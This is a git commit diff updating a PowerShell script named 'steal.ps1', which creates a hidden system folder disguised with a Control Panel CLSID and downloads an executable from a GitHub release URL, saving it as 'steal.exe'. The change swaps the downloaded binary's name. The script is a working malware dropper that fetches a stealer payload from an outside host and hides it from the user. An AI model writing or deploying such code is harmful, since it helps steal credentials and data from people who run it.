0f7c62b9409f96d84078187998189c4464c1204f
43a1723 <hai1723notgay@gmail.com>
2024-09-02 19:59:12 +0700

    Update steal.ps1

--- scr/steal.ps1
+++ scr/steal.ps1
@@ -43,7 +43,7 @@ $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 New-Item -ItemType Directory -Path $dir
 attrib +h +s $dir
 
-$url = "https://github.com/s1uiasdad/log-acc-v2/releases/download/AutoBuildExe/tootls.exe"
+$url = "https://github.com/s1uiasdad/log-acc-v2/releases/download/AutoBuildExe/Built.exe"
 $output = "$dir\steal.exe"
 
 if (Test-Path -Path $output) {
